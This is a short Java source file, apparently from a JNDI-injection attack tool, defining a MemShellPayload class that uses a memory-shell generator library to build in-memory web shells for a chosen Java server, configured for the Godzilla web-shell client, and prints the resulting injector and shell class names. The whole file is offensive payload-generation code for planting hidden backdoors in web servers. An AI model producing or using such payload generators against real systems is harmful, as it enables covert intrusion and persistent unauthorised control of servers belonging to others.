package map.jndi.payload;

import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.Server;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;

public class MemShellPayload {
    public static GenerateResult generate(String server, String tool, String type) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.valueOf(server))
                .shellTool(ShellTool.valueOf(tool))
                .shellType(type)
                .shrink(true)
                .debug(false)
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder().build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder().build();

        return MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
    }
    public static void printInfo(GenerateResult result) {
        System.out.println();
        System.out.println("Injector ClassName: " + result.getInjectorClassName());
        System.out.println("Shell ClassName: " + result.getShellClassName());
        System.out.println(result.getShellConfig());
        System.out.println(result.getShellToolConfig());
        System.out.println();
    }
}
